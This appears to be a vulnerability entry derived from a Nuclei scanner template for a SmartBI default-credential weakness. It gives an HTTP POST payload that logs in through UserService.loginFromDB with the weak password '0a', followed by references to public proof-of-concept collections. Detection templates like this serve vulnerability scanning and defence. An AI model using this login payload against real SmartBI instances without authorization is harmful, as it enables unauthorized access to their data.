# Nuclei Template: SmartBI - Default Login
**Template ID:** smartbi-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`smartbi-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Smartbi Default User Weak Password were discovered.

## Steps to reproduce / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

className=UserService&methodName=loginFromDB&params=["{{role}}","0a"]
```

## References
- https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247491565&idx=1&sn=eb2af62a72167c6f82ae8ec3db878511
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/smartbi-default-user-weakpass.yaml
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Smartbi%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
